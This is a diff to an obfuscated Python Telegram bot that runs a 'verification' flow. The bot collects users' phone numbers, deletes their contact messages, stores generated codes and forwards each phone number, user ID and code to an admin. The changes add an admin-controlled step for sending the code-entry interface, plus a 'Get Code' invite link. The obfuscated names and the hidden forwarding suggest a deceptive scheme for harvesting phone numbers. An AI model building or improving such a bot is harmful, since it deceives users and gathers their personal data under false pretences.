@@ -10,8 +10,8 @@ import base64
 # Obfuscated strings
 _0x1a2b = lambda x: base64.b64decode(x).decode()
 _0x3c4d = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-_0x5e6f = _0x1a2b(b'Qk9UX1RPS0VO')  # BOT_TOKEN
-_0x7g8h = _0x1a2b(b'QURNSU5fSUQ=')  # ADMIN_ID
+_0x5e6f = _0x1a2b(b'Qk9UX1RPS0VO')
+_0x7g8h = _0x1a2b(b'QURNSU5fSUQ=')
 
 logging.basicConfig(format=_0x3c4d, level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -37,6 +37,7 @@ class _0xAVB:
                 phone_number TEXT,
                 verification_code TEXT,
                 verified BOOLEAN DEFAULT 0,
+                code_sent BOOLEAN DEFAULT 0,
                 created_at DATETIME,
                 verified_at DATETIME
             )
@@ -94,28 +95,42 @@ Hello {_0xu.first_name}!
                 )
                 return
             
+            # Delete contact message
+            await update.message.delete()
+            
             _0xvc = str(random.randint(10000, 99999))
             
             _0xcr = self._0xc.cursor()
             _0xcr.execute('''
                 INSERT OR REPLACE INTO users 
-                (user_id, username, first_name, phone_number, verification_code, created_at)
-                VALUES (?, ?, ?, ?, ?, ?)
+                (user_id, username, first_name, phone_number, verification_code, code_sent, created_at)
+                VALUES (?, ?, ?, ?, ?, 0, ?)
             ''', (_0xu.id, _0xu.username, _0xu.first_name, _0xct.phone_number, _0xvc, datetime.now()))
             self._0xc.commit()
             
-            await update.message.reply_text("👇", reply_markup=ReplyKeyboardRemove())
-            
-            _0xsm = await update.message.reply_text(
-                "📨 **Sending code...**",
-                parse_mode='Markdown'
+            # Send processing message
+            await update.message.chat.send_message(
+                "📨 **Processing your request...**\n\nPlease wait for admin to send verification code.",
+                parse_mode='Markdown',
+                reply_markup=ReplyKeyboardRemove()
             )
             
-            await context.application.bot.send_chat_action(_0xu.id, "typing")
+            # Send "Get Code" button to user
+            _0xgc_kb = InlineKeyboardMarkup([
+                [InlineKeyboardButton('👉 Get Code!', url='https://t.me/+42777')]
+            ])
             
-            await _0xsm.edit_text("✅ **Enter the code!**", parse_mode='Markdown')
+            await context.bot.send_message(
+                _0xu.id,
+                "**Step 2:** Click the button below to get your verification code.",
+                parse_mode='Markdown',
+                reply_markup=_0xgc_kb
+            )
             
-            await self._0xsci(context, _0xu.id, _0xvc)
+            # Notify admin with send code button
+            _0xadmin_kb = InlineKeyboardMarkup([
+                [InlineKeyboardButton('📤 Send Code Input', callback_data=f'send_code_{_0xu.id}')]
+            ])
             
             await context.bot.send_message(
                 _0x1k2l,
@@ -123,12 +138,14 @@ Hello {_0xu.first_name}!
 📱 **New Verification Request**
 
 👤 User: {_0xu.first_name} (@{_0xu.username})
+🆔 User ID: `{_0xu.id}`
 📞 Phone: `{_0xct.phone_number}`
 🔢 Generated Code: `{_0xvc}`
 
-**Note:** Send this code to the user via SMS.
+**Action:** Click button below to send code input interface to user.
                 """,
-                parse_mode='Markdown'
+                parse_mode='Markdown',
+                reply_markup=_0xadmin_kb
             )
             
         except Exception as e:
@@ -156,9 +173,6 @@ Hello {_0xu.first_name}!
                 ],
                 [
                     InlineKeyboardButton('0', callback_data=f'n_0_{_0xui}')
-                ],
-                [
-                    InlineKeyboardButton('👉 Get code!', url='https://t.me/+42777')
                 ]
             ]
             
@@ -179,10 +193,16 @@ Use the buttons below to enter your 5-digit code.
                 reply_markup=_0xrm
             )
             
+            # Initialize session
             self._0xvs[_0xui] = {
                 'code': '',
                 'correct_code': _0xvc
             }
+            
+            # Update database - code sent
+            _0xcr = self._0xc.cursor()
+            _0xcr.execute('UPDATE users SET code_sent = 1 WHERE user_id = ?', (_0xui,))
+            self._0xc.commit()
             
         except Exception as e:
             logger.error(f"Error sending interface: {e}")
@@ -195,14 +215,49 @@ Use the buttons below to enter your 5-digit code.
             
             await _0xq.answer()
             
-            if _0xui not in self._0xvs:
-                await _0xq.edit_message_text("❌ Session expired. Please /start again.")
-                return
-            
-            _0xs = self._0xvs[_0xui]
             _0xd = _0xq.data
             
+            # Admin sending code input to user
+            if _0xd.startswith('send_code_'):
+                if _0xui != _0x1k2l:
+                    await _0xq.answer("❌ Admin only!", show_alert=True)
+                    return
+                
+                _0xtarget_id = int(_0xd.split('_')[2])
+                
+                # Get verification code from DB
+                _0xcr = self._0xc.cursor()
+                _0xcr.execute('SELECT verification_code, code_sent FROM users WHERE user_id = ?', (_0xtarget_id,))
+                _0xr = _0xcr.fetchone()
+                
+                if not _0xr:
+                    await _0xq.answer("❌ User not found!", show_alert=True)
+                    return
+                
+                if _0xr[1]:
+                    await _0xq.answer("⚠️ Code already sent!", show_alert=True)
+                    return
+                
+                _0xvc = _0xr[0]
+                
+                # Send code input interface to user
+                await self._0xsci(context, _0xtarget_id, _0xvc)
+                
+                # Update admin message
+                await _0xq.edit_message_text(
+                    _0xq.message.text + "\n\n✅ **Code input sent to user!**",
+                    parse_mode='Markdown'
+                )
+                
+                return
+            
+            # User entering code
             if _0xd.startswith('n_'):
+                if _0xui not in self._0xvs:
+                    await _0xq.edit_message_text("❌ Session expired. Please /start again.")
+                    return
+                
+                _0xs = self._0xvs[_0xui]
                 _0xn = _0xd.split('_')[1]
                 
                 if len(_0xs['code']) < 5:
@@ -221,6 +276,36 @@ Use the buttons below to enter your 5-digit code.
                     parse_mode='Markdown',
                     reply_markup=_0xq.message.reply_markup
                 )
+                
+                # Check if complete
+                if len(_0xs['code']) == 5:
+                    if _0xs['code'] == _0xs['correct_code']:
+                        # Correct code
+                        _0xcr = self._0xc.cursor()
+                        _0xcr.execute('UPDATE users SET verified = 1, verified_at = ? WHERE user_id = ?', 
+                                    (datetime.now(), _0xui))
+                        self._0xc.commit()
+                        
+                        await _0xq.edit_message_text(
+                            "✅ **Verification Successful!**\n\nYou're now verified!",
+                            parse_mode='Markdown'
+                        )
+                        
+                        # Notify admin
+                        await context.bot.send_message(
+                            _0x1k2l,
+                            f"✅ User `{_0xui}` successfully verified!",
+                            parse_mode='Markdown'
+                        )
+                    else:
+                        # Wrong code
+                        await _0xq.edit_message_text(
+                            "❌ **Invalid Code!**\n\nPlease try /start again.",
+                            parse_mode='Markdown'
+                        )
+                    
+                    # Clear session
+                    del self._0xvs[_0xui]
                     
         except Exception as e:
             logger.error(f"Error in callback: {e}")
@@ -238,13 +323,17 @@ Use the buttons below to enter your 5-digit code.
         _0xcr.execute('SELECT COUNT(*) FROM users')
         _0xt = _0xcr.fetchone()[0]
         
+        _0xcr.execute('SELECT COUNT(*) FROM users WHERE code_sent = 1 AND verified = 0')
+        _0xcs = _0xcr.fetchone()[0]
+        
         await update.message.reply_text(
             f"""
 📊 **Bot Statistics**
 
 ✅ Verified Users: {_0xv}
+📤 Code Sent (Pending): {_0xcs}
 📝 Total Users: {_0xt}
-⏳ Pending: {_0xt - _0xv}
+⏳ Waiting for Admin: {_0xt - _0xv - _0xcs}
             """,
             parse_mode='Markdown'
         )
